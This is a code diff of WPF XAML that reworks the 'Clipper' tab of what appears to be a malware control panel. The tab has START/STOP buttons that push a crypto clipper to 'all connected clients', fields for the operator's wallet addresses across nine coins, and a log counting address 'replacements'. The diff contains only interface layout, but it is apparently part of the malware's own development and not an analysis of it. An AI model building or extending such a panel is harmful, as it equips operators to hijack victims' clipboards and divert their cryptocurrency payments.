@@ -1546,125 +1546,112 @@
                 <TabItem>
                     <TabItem.Header>
                         <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                            <TextBlock Text="₿" Foreground="#f9e2af" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
+                            <TextBlock Text="&#x20BF;" Foreground="#f9e2af" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                             <TextBlock Text="Clipper"/>
                         </StackPanel>
                     </TabItem.Header>
-                    <Border Padding="14,12">
-                        <Grid>
-                            <Grid.RowDefinitions>
-                                <RowDefinition Height="Auto"/>
-                                <RowDefinition Height="12"/>
-                                <RowDefinition Height="*"/>
-                            </Grid.RowDefinitions>
+                    <ScrollViewer VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
+                    <StackPanel Margin="14,10,14,14">
 
-                            <!-- Config card -->
-                            <Border Grid.Row="0" Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040" CornerRadius="6" Padding="12,10">
+                        <!-- Controls bar -->
+                        <Border Margin="0,0,0,8" Padding="12,8" CornerRadius="6"
+                                Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
+                            <Grid>
+                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                                    <TextBlock Text="CRYPTO CLIPPER" FontSize="9" FontWeight="Bold"
+                                               Foreground="#C0f9e2af" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                    <Border x:Name="ClipperActiveBadge" Margin="10,0,0,0" CornerRadius="3"
+                                            Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
+                                            Padding="6,2" Visibility="Collapsed" VerticalAlignment="Center">
+                                        <StackPanel Orientation="Horizontal">
+                                            <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
+                                                <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="4" ShadowDepth="0" Opacity="0.9"/></Ellipse.Effect>
+                                            </Ellipse>
+                                            <TextBlock Text="ACTIVE" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Segoe UI"/>
+                                        </StackPanel>
+                                    </Border>
+                                    <TextBlock x:Name="ClipperCountTxt" Text=""
+                                               Foreground="#404868" FontSize="11" FontFamily="Consolas"
+                                               VerticalAlignment="Center" Margin="14,0,0,0"/>
+                                </StackPanel>
+                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
+                                    <Button x:Name="BtnClipperStart" Content="START" Width="76" Height="30"
+                                            Margin="0,0,6,0" Style="{StaticResource SGreenBtn}"
+                                            Click="ClipperStart_Click"
+                                            ToolTip="Enable clipper and push to all connected clients"/>
+                                    <Button x:Name="BtnClipperStop" Content="STOP" Width="68" Height="30"
+                                            Style="{StaticResource SRedBtn}" IsEnabled="False" Opacity="0.4"
+                                            Click="ClipperStop_Click"
+                                            ToolTip="Disable clipper on all connected clients"/>
+                                </StackPanel>
+                            </Grid>
+                        </Border>
+
+                        <!-- Address cards (2 columns) -->
+                        <Grid Margin="0,0,0,8">
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="*"/>
+                                <ColumnDefinition Width="8"/>
+                                <ColumnDefinition Width="*"/>
+                            </Grid.ColumnDefinitions>
+                            <Border Grid.Column="0" Padding="12,10" CornerRadius="6"
+                                    Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                 <StackPanel>
-                                    <Grid Margin="0,0,0,10">
-                                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                            <TextBlock Text="CRYPTO CLIPPER" FontSize="9" FontWeight="Bold"
-                                                       Foreground="#C0f9e2af" FontFamily="Consolas"/>
-                                            <Border x:Name="ClipperActiveBadge" Margin="10,0,0,0" CornerRadius="3"
-                                                    Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
-                                                    Padding="6,1" Visibility="Collapsed" VerticalAlignment="Center">
-                                                <StackPanel Orientation="Horizontal">
-                                                    <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,4,0">
-                                                        <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="3" ShadowDepth="0" Opacity="0.8"/></Ellipse.Effect>
-                                                    </Ellipse>
-                                                    <TextBlock Text="SENDING TO CLIENTS" Foreground="#22C55E" FontSize="8" FontWeight="Bold" FontFamily="Segoe UI"/>
-                                                </StackPanel>
-                                            </Border>
-                                        </StackPanel>
-                                        <StackPanel Orientation="Horizontal" HorizontalAlignment="Right">
-                                            <Button x:Name="BtnClipperStart" Content="▶ START" Width="80" Height="26" Margin="0,0,6,0"
-                                                    Style="{StaticResource SGreenBtn}" FontSize="10"
-                                                    Click="ClipperStart_Click"
-                                                    ToolTip="Enable clipper and push config to all online clients"/>
-                                            <Button x:Name="BtnClipperStop" Content="■ STOP" Width="72" Height="26"
-                                                    Style="{StaticResource SRedBtn}" FontSize="10"
-                                                    IsEnabled="False" Opacity="0.45"
-                                                    Click="ClipperStop_Click"
-                                                    ToolTip="Disable clipper on all online clients"/>
-                                        </StackPanel>
-                                    </Grid>
-                                    <!-- Address grid 2 columns -->
-                                    <Grid>
-                                        <Grid.ColumnDefinitions>
-                                            <ColumnDefinition Width="*"/>
-                                            <ColumnDefinition Width="8"/>
-                                            <ColumnDefinition Width="*"/>
-                                        </Grid.ColumnDefinitions>
-                                        <StackPanel Grid.Column="0">
-                                            <TextBlock Text="BTC" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperBTC" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="Bitcoin — 1... / 3... / bc1..."/>
-                                            <TextBlock Text="ETH / BNB" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperETH" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="Ethereum / BNB Smart Chain — 0x..."/>
-                                            <TextBlock Text="LTC" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperLTC" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="Litecoin — L... / M..."/>
-                                            <TextBlock Text="TRX" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperTRX" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="TRON — T..."/>
-                                            <TextBlock Text="SOL" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperSOL" Style="{StaticResource STxt}"
-                                                     ToolTip="Solana — base58, 32-44 chars"/>
-                                        </StackPanel>
-                                        <StackPanel Grid.Column="2">
-                                            <TextBlock Text="XMR" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperXMR" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="Monero — 4..."/>
-                                            <TextBlock Text="XRP" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperXRP" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="Ripple — r..."/>
-                                            <TextBlock Text="DASH" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperDASH" Style="{StaticResource STxt}" Margin="0,0,0,6"
-                                                     ToolTip="Dash — X..."/>
-                                            <TextBlock Text="BCH" Style="{StaticResource SFieldLabel}"/>
-                                            <TextBox x:Name="ClipperBCH" Style="{StaticResource STxt}"
-                                                     ToolTip="Bitcoin Cash — bitcoincash:q..."/>
-                                        </StackPanel>
-                                    </Grid>
+                                    <TextBlock Text="ADDRESSES" FontSize="9" FontWeight="Bold"
+                                               Foreground="#C0f9e2af" FontFamily="Consolas" Margin="0,0,0,10"/>
+                                    <TextBlock Text="BTC" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperBTC" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="Bitcoin"/>
+                                    <TextBlock Text="ETH / BNB" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperETH" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="Ethereum / BNB Smart Chain (0x...)"/>
+                                    <TextBlock Text="LTC" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperLTC" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="Litecoin (L... / M...)"/>
+                                    <TextBlock Text="TRX" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperTRX" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="TRON (T...)"/>
+                                    <TextBlock Text="SOL" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperSOL" Style="{StaticResource STxt}" ToolTip="Solana (base58, 32-44 chars)"/>
                                 </StackPanel>
                             </Border>
-
-                            <!-- Detection log -->
-                            <Border Grid.Row="2" Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040" CornerRadius="6" Padding="12,10">
-                                <Grid>
-                                    <Grid.RowDefinitions>
-                                        <RowDefinition Height="Auto"/>
-                                        <RowDefinition Height="8"/>
-                                        <RowDefinition Height="*"/>
-                                    </Grid.RowDefinitions>
-                                    <Grid Grid.Row="0">
-                                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                                            <TextBlock Text="DETECTIONS" FontSize="9" FontWeight="Bold"
-                                                       Foreground="#C0a6e3a1" FontFamily="Consolas"/>
-                                            <TextBlock x:Name="ClipperCountTxt" Text="  —  0 replacements"
-                                                       FontSize="9" Foreground="#505878" FontFamily="Consolas"
-                                                       VerticalAlignment="Center"/>
-                                        </StackPanel>
-                                        <Button Content="Clear" Width="52" Height="22" HorizontalAlignment="Right"
-                                                Style="{StaticResource SBtn}" FontSize="9"
-                                                Click="ClipperClearLog_Click"/>
-                                    </Grid>
-                                    <Border Grid.Row="2" Background="#050610" CornerRadius="4">
-                                        <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto">
-                                            <TextBox x:Name="ClipperLog"
-                                                     Background="Transparent" Foreground="#C8D0E8"
-                                                     FontFamily="Consolas" FontSize="11"
-                                                     BorderThickness="0" Padding="8,6"
-                                                     IsReadOnly="True" TextWrapping="Wrap"
-                                                     AcceptsReturn="True"/>
-                                        </ScrollViewer>
-                                    </Border>
-                                </Grid>
+                            <Border Grid.Column="2" Padding="12,10" CornerRadius="6"
+                                    Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
+                                <StackPanel>
+                                    <TextBlock Text=" " FontSize="9" Margin="0,0,0,10"/>
+                                    <TextBlock Text="XMR" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperXMR" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="Monero (4...)"/>
+                                    <TextBlock Text="XRP" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperXRP" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="Ripple (r...)"/>
+                                    <TextBlock Text="DASH" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperDASH" Style="{StaticResource STxt}" Margin="0,0,0,8" ToolTip="Dash (X...)"/>
+                                    <TextBlock Text="BCH" Style="{StaticResource SFieldLabel}"/>
+                                    <TextBox x:Name="ClipperBCH" Style="{StaticResource STxt}" ToolTip="Bitcoin Cash (bitcoincash:q...)"/>
+                                </StackPanel>
                             </Border>
-
                         </Grid>
-                    </Border>
+
+                        <!-- Detection log -->
+                        <Border Padding="12,10" CornerRadius="6"
+                                Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
+                            <StackPanel>
+                                <Grid Margin="0,0,0,8">
+                                    <TextBlock Text="DETECTIONS" FontSize="9" FontWeight="Bold"
+                                               Foreground="#C0a6e3a1" FontFamily="Consolas" VerticalAlignment="Center"/>
+                                    <Button Content="Clear" Width="56" Height="26" HorizontalAlignment="Right"
+                                            Style="{StaticResource SBtn}" Click="ClipperClearLog_Click"/>
+                                </Grid>
+                                <Border Background="#05060E" CornerRadius="4" Height="150">
+                                    <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto">
+                                        <TextBox x:Name="ClipperLog"
+                                                 Background="Transparent" Foreground="#C8D0E8"
+                                                 FontFamily="Consolas" FontSize="11"
+                                                 BorderThickness="0" Padding="8,6"
+                                                 IsReadOnly="True" TextWrapping="Wrap"
+                                                 AcceptsReturn="True"/>
+                                    </ScrollViewer>
+                                </Border>
+                            </StackPanel>
+                        </Border>
+
+                    </StackPanel>
+                    </ScrollViewer>
                 </TabItem>
 
             </TabControl>
